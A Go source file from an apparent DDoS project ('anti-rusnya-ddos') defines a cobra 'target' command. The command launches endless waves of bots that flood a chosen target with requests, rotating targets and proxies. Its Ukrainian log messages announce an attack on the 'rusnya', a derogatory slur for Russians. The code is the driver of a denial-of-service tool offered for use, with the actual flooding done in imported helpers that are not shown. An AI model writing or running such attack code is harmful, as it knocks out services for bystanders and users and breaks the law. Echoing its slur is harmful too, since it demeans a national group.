package cmd

import (
	"context"
	"sync"
	"sync/atomic"

	log "github.com/sirupsen/logrus"

	"github.com/meddion/anti-rusnya-ddos/pkg"
	"github.com/spf13/cobra"
)

var (
	targetCmd = &cobra.Command{
		Use:   "target",
		Short: "надсилає багато запитів на обрані цілі",
		Args:  cobra.MinimumNArgs(1),
		Run:   targetRun,
	}
)

func targetRun(cmd *cobra.Command, args []string) {
	// Shutdown signal
	done, terminate := CreateDoneChan()
	startOsSignalHandler(terminate)

	// Os signal handler
	epoch := int64(0)
	for {
		atomic.AddInt64(&epoch, 1)

		select {
		case <-done:
			return
		default:
		}

		ctx, termBots := context.WithCancel(context.Background())
		startBotHandler(done, termBots, &epoch, epoch)

		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
		log.Infof("Кожні %d запитів ціль і проксі можуть змінюватися.\n", reqPerEpoch)
		log.Infof("Ціль: %s\n", args[0])

		targetData := pkg.NewTargetData(args[0])

		if err := pkg.ValidateTargetData(targetData); err != nil {
			log.Errorf("Під час валідації даних про атаку (перевірте джерело): %v", err)
			continue
		}

		var wg sync.WaitGroup
		counter := make(chan bool, botsNum)

		if err := pkg.StartBots(ctx, &wg, targetData, maxErrCount, botsNum, counter); err != nil {
			log.Errorf("Не вдалося запустити ботів: %v\n", err)
			continue
		}

		go pkg.RequestLimiter(ctx, termBots, &wg, 0, counter)

		wg.Wait()
	}
}
